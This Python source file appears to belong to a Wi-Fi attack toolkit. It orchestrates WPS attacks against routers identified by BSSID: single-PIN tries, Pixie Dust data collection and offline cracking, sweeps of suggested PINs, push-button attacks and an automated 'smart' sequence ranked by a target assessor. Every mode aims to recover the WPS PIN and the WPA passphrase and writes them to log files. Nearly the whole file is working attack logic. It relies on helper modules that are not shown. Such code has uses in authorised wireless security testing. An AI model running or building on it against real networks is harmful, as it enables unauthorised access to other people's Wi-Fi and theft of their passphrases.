#!/usr/bin/env python3
"""
Attack Module v3 - Direct WPS Engine (no ose.py needed)
Uses WpsEngine directly instead of running ose.py as subprocess
"""

import sys
import time
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from modules.wps_pins import suggest_pins, detect_manufacturer
from modules.wpa_engine import WpsEngine

LOGS_DIR = Path(__file__).parent.parent / "logs"
LOGS_DIR.mkdir(parents=True, exist_ok=True)


def _extract_attempted_pins(attempts):
    pins = set()
    for attempt in attempts:
        pin = attempt.get("pin")
        if pin:
            pins.add(pin)
    return pins


def _result_status(result, default="completed"):
    if not isinstance(result, dict):
        return default
    status = result.get("status")
    if status:
        return status
    return default


def _is_real_success(result):
    if not isinstance(result, dict):
        return False
    if result.get("status") != "success":
        return False
    if not result.get("psk"):
        return False
    if result.get("attempted_pin") == "PBC":
        return True
    return bool(result.get("pin"))


def analyze_target(bssid, wps_version="", wps_locked="Unknown"):
    """Analyze target and return smart PIN suggestions"""
    manufacturer, algo, confidence = detect_manufacturer(bssid)
    pins = suggest_pins(bssid, wps_version, wps_locked)

    analysis = {
        "bssid": bssid,
        "manufacturer": manufacturer or "Unknown",
        "algorithm": algo or "generic",
        "confidence": confidence,
        "pins": pins[:10],
        "best_pin": pins[0]["pin"] if pins else "12345670",
        "total_pins": len(pins),
    }

    return analysis


def run_wps_attack(interface, attack_type, bssid=None, pin=None, callback=None,
                   skip_pins=None):
    """
    Run WPS attack using direct WpsEngine (no ose.py).

    Attack types:
      - "pin": WPS PIN attack with specific PIN
      - "pixie": Pixie Dust data collection + crack
      - "bruteforce": Controlled sweep of suggested PINs via WpsEngine
      - "pbc": Push Button Connect
      - "smart": Uses best PIN from analysis
    """
    if attack_type == "smart" and bssid and not pin:
        analysis = analyze_target(bssid)
        pin = analysis["best_pin"]
        if callback and analysis["pins"]:
            callback(
                "[*] Smart PIN selected: {pin} ({method})".format(
                    pin=pin,
                    method=analysis["pins"][0]["method"],
                )
            )

    found_pin = None
    found_psk = None
    output_lines = []
    attempt_records = []
    skipped_pins = set(skip_pins or [])
    final_status = "completed"
    final_attempted_pin = pin
    log_file = LOGS_DIR / "attack_{ts}.log".format(
        ts=datetime.now().strftime("%Y%m%d_%H%M%S"))

    def cb(message):
        output_lines.append(message)
        if callback:
            callback(message)

    engine = WpsEngine(interface)
    ok, message = engine.start()

    if not ok:
        cb("[!] Engine error: " + message)
        return {
            "pin": None,
            "attempted_pin": pin,
            "psk": None,
            "status": "error",
            "output": message,
            "log_file": str(log_file),
            "attempts": [],
        }

    engine.callback = cb

    with open(log_file, "w") as handle:
        handle.write("[*] Attack started: {value}\n".format(
            value=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ))
        handle.write("[*] Interface: {iface} | Type: {atype} | BSSID: {bssid}\n".format(
            iface=interface,
            atype=attack_type,
            bssid=bssid or "any",
        ))

    try:
        if attack_type == "pin" and pin:
            cb("[*] Trying PIN: " + pin)
            started = time.time()
            result = engine.wps_pin_attack(bssid, pin, timeout=60)
            elapsed = time.time() - started
            attempt_records.append({
                "pin": pin,
                "status": result.get("status", "unknown"),
                "response": result.get("output", "")[-500:],
                "duration": elapsed,
            })
            final_status = _result_status(result)
            final_attempted_pin = result.get("attempted_pin") or pin
            if _is_real_success(result):
                found_pin = result.get("pin")
                found_psk = result.get("psk")

        elif attack_type == "pixie":
            cb("[*] Collecting Pixie Dust data...")
            # Engine already runs pixiewps + online verify internally.
            # Do NOT run a second pixiewps pass here (it wiped data before).
            result = engine.collect_pixie_data(
                bssid,
                max_attempts=8,
                skip_pins=skipped_pins,
            )
            attempt_records.extend(result.get("attempts", []))
            final_status = _result_status(result)
            final_attempted_pin = result.get("attempted_pin") or result.get("pixie_pin")

            pixie = result.get("pixie_data", {}) or {}
            collected = sum(
                1 for key in [
                    "PKE", "PKR", "E_NONCE", "R_NONCE",
                    "AUTHKEY", "E_HASH1", "E_HASH2",
                ]
                if pixie.get(key)
            )
            cb("[*] Pixie fields retained: {count}/7".format(count=collected))

            if _is_real_success(result):
                found_pin = result.get("pin")
                found_psk = result.get("psk")
                final_status = "success"
                final_attempted_pin = result.get("attempted_pin") or found_pin
                cb("[+] PIXIE SUCCESS — PIN and PSK verified")
            elif result.get("status") == "pixie_pin_unverified":
                # Offline crack found a PIN but PSK not confirmed yet
                found_pin = result.get("pixie_pin") or result.get("pin")
                final_attempted_pin = found_pin
                final_status = "pixie_pin_unverified"
                cb("[ok]PIXIEWPS recovered PIN: {pin}[/]".format(pin=found_pin))
                cb(
                    "[warn]PSK not verified online yet "
                    "(weak signal / timeout / lock). "
                    "Retry a single PIN attack with this PIN when closer to AP."
                )
                # One more verify attempt with clear_pixie=False if still no PSK
                if found_pin:
                    cb("[*] Retrying online verify for PIN {pin}...".format(
                        pin=found_pin
                    ))
                    # Restore engine pixie snapshot if present
                    if pixie:
                        engine.pixie_data = dict(pixie)
                    verify_started = time.time()
                    verify_result = engine.wps_pin_attack(
                        bssid,
                        found_pin,
                        timeout=60,
                        clear_pixie=False,
                    )
                    verify_elapsed = time.time() - verify_started
                    attempt_records.append({
                        "pin": found_pin,
                        "status": verify_result.get("status", "unknown"),
                        "response": verify_result.get("output", "")[-500:],
                        "duration": verify_elapsed,
                    })
                    if _is_real_success(verify_result):
                        found_pin = verify_result.get("pin") or found_pin
                        found_psk = verify_result.get("psk")
                        final_status = "success"
                        final_attempted_pin = found_pin
                        cb("[+] PIN VERIFIED on retry — PSK captured")
                    else:
                        cb(
                            "[!] Verify status: {st}. "
                            "Save PIN {pin} and retry from menu PIN attack.".format(
                                st=verify_result.get("status"),
                                pin=found_pin,
                            )
                        )
            elif result.get("status") == "pixie_not_vulnerable":
                final_status = "pixie_not_vulnerable"
                cb(
                    "[!] Pixie offline attack failed with full data — "
                    "this AP is likely NOT vulnerable to classic pixiewps. "
                    "Do not spam Pixie on this BSSID."
                )
            elif collected < 4:
                cb("[!] Not enough data for pixiewps ({count}/7)".format(
                    count=collected
                ))
                final_status = "data_incomplete"

        elif attack_type == "bruteforce":
            analysis = analyze_target(bssid)
            all_pins = []
            for pin_info in analysis["pins"]:
                candidate = pin_info["pin"]
                if candidate not in all_pins:
                    all_pins.append(candidate)
            pending_pins = [
                candidate for candidate in all_pins
                if candidate not in skipped_pins
            ]
            cb("[*] Suggested PIN sweep: {pending} pending, {skipped} already tried".format(
                pending=len(pending_pins),
                skipped=len(all_pins) - len(pending_pins),
            ))
            if not pending_pins:
                cb("[*] Resume database says all suggested PINs were already tried")
            for index, try_pin in enumerate(pending_pins, 1):
                cb("[{index}/{count}] Trying PIN: {pin}".format(
                    index=index,
                    count=len(pending_pins),
                    pin=try_pin,
                ))
                started = time.time()
                result = engine.wps_pin_attack(bssid, try_pin, timeout=30)
                elapsed = time.time() - started
                attempt_records.append({
                    "pin": try_pin,
                    "status": result.get("status", "unknown"),
                    "response": result.get("output", "")[-500:],
                    "duration": elapsed,
                })
                final_status = _result_status(result)
                final_attempted_pin = result.get("attempted_pin") or try_pin
                if _is_real_success(result):
                    found_pin = result.get("pin")
                    found_psk = result.get("psk")
                    cb("[+] SUCCESS! PIN: {pin} PSK: {psk}".format(
                        pin=found_pin,
                        psk=found_psk,
                    ))
                    break
                if result.get("status") == "locked":
                    cb("[!] AP reports WPS locked. Stopping sweep.")
                    break
                if result.get("status") == "m2d_rejected":
                    cb("[!] AP rejected or deferred the session (M2D). Stopping sweep.")
                    break
                if result.get("is_locked"):
                    final_status = "locked"
                    cb("[!] AP locked after this attempt.")
                    break
            else:
                if len(pending_pins) > 1:
                    final_status = "completed"
                elif pending_pins:
                    final_status = attempt_records[-1].get("status", "completed")

        elif attack_type == "pbc":
            cb("[*] WPS PBC - press the button on the router!")
            result = engine.wps_pbc_attack(bssid, timeout=120)
            final_status = _result_status(result)
            final_attempted_pin = result.get("attempted_pin")
            if _is_real_success(result):
                found_pin = result.get("pin")
                found_psk = result.get("psk")

        else:
            if not pin:
                pin = "12345670"
            cb("[*] Trying PIN: " + pin)
            started = time.time()
            result = engine.wps_pin_attack(bssid, pin, timeout=60)
            elapsed = time.time() - started
            attempt_records.append({
                "pin": pin,
                "status": result.get("status", "unknown"),
                "response": result.get("output", "")[-500:],
                "duration": elapsed,
            })
            final_status = _result_status(result)
            final_attempted_pin = result.get("attempted_pin") or pin
            if _is_real_success(result):
                found_pin = result.get("pin")
                found_psk = result.get("psk")

    except KeyboardInterrupt:
        cb("[!] Interrupted by user")
        result = engine._result() if hasattr(engine, "_result") else {}
        final_status = _result_status(result, "stopped")
        final_attempted_pin = result.get("attempted_pin") or final_attempted_pin

    finally:
        engine.stop()

    # Keep recovered PIN even when PSK not yet verified (pixie offline hit)
    if final_status == "success":
        pass
    elif final_status == "pixie_pin_unverified":
        found_psk = None
        # found_pin already set above
    else:
        found_pin = None
        found_psk = None

    with open(log_file, "a") as handle:
        handle.write("\n" + "=" * 50 + "\n")
        handle.write("Status: {status}\n".format(status=final_status))
        if found_pin:
            handle.write("PIN: {value}\n".format(value=found_pin))
        if found_psk:
            handle.write("PSK: {value}\n".format(value=found_psk))
        if final_attempted_pin:
            handle.write("Attempted PIN: {value}\n".format(value=final_attempted_pin))
        for line in output_lines[-20:]:
            handle.write(line + "\n")

    return {
        "pin": found_pin,
        "attempted_pin": final_attempted_pin,
        "psk": found_psk,
        "status": final_status,
        "output": "\n".join(output_lines),
        "log_file": str(log_file),
        "attempts": attempt_records,
    }


def run_smart_attack(interface, bssid, wps_version="",
                     wps_locked="Unknown", callback=None, skip_pins=None,
                     essid="", network=None):
    """
    Smart attack sequence driven by TargetAssessor ranking when possible:
      - high-confidence known PINs first
      - Pixie only if tier is high/medium (skip last-resort automatically)
      - limited calculated PIN tries
    Falls back to legacy PIN→Pixie→top3 if assessor unavailable.
    """
    analysis = analyze_target(bssid, wps_version, wps_locked)
    combined_attempts = []
    tried_pins = set(skip_pins or [])
    last_result = {
        "pin": None,
        "attempted_pin": None,
        "psk": None,
        "status": "completed",
        "output": "",
        "log_file": "",
        "attempts": [],
    }

    # Prefer offline assessment plan
    plan = None
    try:
        from modules.target_assessment import TargetAssessor
        net = dict(network or {})
        net.setdefault("bssid", bssid)
        net.setdefault("essid", essid or "Unknown")
        net.setdefault("wps_version", wps_version)
        net.setdefault("wps_locked", wps_locked)
        net.setdefault("has_wps", 1)
        plan = TargetAssessor().assess(net)
    except Exception:
        plan = None

    if callback:
        callback("\n" + "=" * 50)
        callback("SMART ATTACK ANALYSIS")
        callback("=" * 50)
        callback("Target:   " + bssid)
        callback("MFR:      " + str(analysis["manufacturer"]))
        callback("Algorithm:" + str(analysis["algorithm"]))
        callback("Best PIN: " + str(analysis["best_pin"]))
        callback("Confidence: " + str(analysis["confidence"]) + "%")
        if plan:
            callback("Pixie:    {tier} ({conf}%)".format(
                tier=plan.get("pixie_tier"),
                conf=plan.get("pixie_confidence"),
            ))
            callback("Order:    {order}".format(
                order=" -> ".join(plan.get("attack_order") or [])[:90]
            ))
            callback("Recommend:" + str(plan.get("recommended_method") or ""))
        if tried_pins:
            callback("Resume:   skipping {count} previously tried PINs".format(
                count=len(tried_pins)
            ))
        callback("=" * 50)

    def _try_pin(pin, label):
        nonlocal last_result, combined_attempts, tried_pins
        if not pin or pin in tried_pins:
            if callback and pin in tried_pins:
                callback("[*] Skipping already tried PIN: " + pin)
            return False
        if callback:
            callback("\n[*] {label}: {pin}".format(label=label, pin=pin))
        last_result = run_wps_attack(interface, "pin", bssid, pin, callback)
        combined_attempts.extend(last_result.get("attempts", []))
        tried_pins.update(_extract_attempted_pins(last_result.get("attempts", [])))
        if last_result["status"] == "success":
            last_result["attempts"] = combined_attempts
            return True
        if last_result["status"] in ("locked", "m2d_rejected"):
            last_result["attempts"] = combined_attempts
            return True  # stop sequence
        return False

    def _try_pixie():
        nonlocal last_result, combined_attempts, tried_pins
        if callback:
            callback("\n[*] Pixie Dust probe...")
        last_result = run_wps_attack(
            interface, "pixie", bssid, None, callback, skip_pins=tried_pins
        )
        combined_attempts.extend(last_result.get("attempts", []))
        tried_pins.update(_extract_attempted_pins(last_result.get("attempts", [])))
        if last_result["status"] == "success":
            last_result["attempts"] = combined_attempts
            return True
        if last_result["status"] in ("locked", "m2d_rejected", "pixie_not_vulnerable"):
            last_result["attempts"] = combined_attempts
            if last_result["status"] == "pixie_not_vulnerable" and callback:
                callback("[*] Skipping further Pixie on this target (not vulnerable).")
            return True
        return False

    # --- Planned path ---
    if plan:
        order = list(plan.get("attack_order") or [])
        max_pins = int(plan.get("max_online_pins") or 3)
        pins = list(plan.get("pin_candidates") or analysis.get("pins") or [])
        # only use reasonably confident pins for auto sequence
        pin_list = []
        for item in pins:
            pin = item.get("pin") if isinstance(item, dict) else None
            conf = int(item.get("confidence") or 0) if isinstance(item, dict) else 0
            if pin and conf >= 20 and pin not in pin_list:
                pin_list.append(pin)
            if len(pin_list) >= max_pins:
                break

        ran_pixie = False
        for method in order:
            if method in ("known_pin_sweep", "calculated_pin_sweep"):
                for index, pin in enumerate(pin_list, 1):
                    stop = _try_pin(
                        pin,
                        "PIN {index}/{total}".format(index=index, total=len(pin_list)),
                    )
                    if stop and last_result.get("status") in (
                        "success", "locked", "m2d_rejected"
                    ):
                        return last_result
            elif method == "pixie_probe" and not ran_pixie:
                ran_pixie = True
                if _try_pixie() and last_result.get("status") in (
                    "success", "locked", "m2d_rejected"
                ):
                    return last_result
                # if not vulnerable, don't continue to last-resort pixie
                if last_result.get("status") == "pixie_not_vulnerable":
                    break
            elif method == "pixie_probe_last_resort":
                # Auto smart-attack skips last-resort Pixie (manual only)
                if callback:
                    callback(
                        "[*] Skipping last-resort Pixie in auto mode "
                        "(conf too low / ISP profile)."
                    )
            elif method in (
                "managed_pmkid_probe",
                "passive_handshake_wait",
                "external_adapter_if_active_capture_required",
            ):
                if callback:
                    callback(
                        "[*] Next offline/managed method suggested: {m} "
                        "(use Handshake/PMKID menus — not auto-run here)".format(
                            m=method
                        )
                    )

        if callback:
            callback("\n[*] Smart sequence finished (WPS online steps).")
        last_result["attempts"] = combined_attempts
        return last_result

    # --- Legacy fallback ---
    best_pin = analysis["best_pin"]
    if _try_pin(best_pin, "Step 1 best PIN") and last_result.get("status") in (
        "success", "locked", "m2d_rejected"
    ):
        return last_result

    if _try_pixie() and last_result.get("status") in (
        "success", "locked", "m2d_rejected", "pixie_not_vulnerable"
    ):
        if last_result.get("status") != "pixie_not_vulnerable":
            # continue only if not clearly immune? legacy continued after fail
            pass
        else:
            last_result["attempts"] = combined_attempts
            return last_result

    step_index = 0
    for pin_info in analysis["pins"][:3]:
        candidate_pin = pin_info["pin"]
        if candidate_pin == best_pin:
            continue
        step_index += 1
        if _try_pin(
            candidate_pin,
            "Step 3.{index} {method}".format(
                index=step_index, method=pin_info.get("method")
            ),
        ) and last_result.get("status") in ("success", "locked", "m2d_rejected"):
            return last_result

    if callback:
        callback("\n[*] Smart attack completed. No credentials found.")
        callback("[*] Suggested PINs exhausted. Check WPS lock/rate limiting.")

    last_result["attempts"] = combined_attempts
    if not combined_attempts and last_result.get("status") == "completed":
        last_result["attempted_pin"] = None
    return last_result
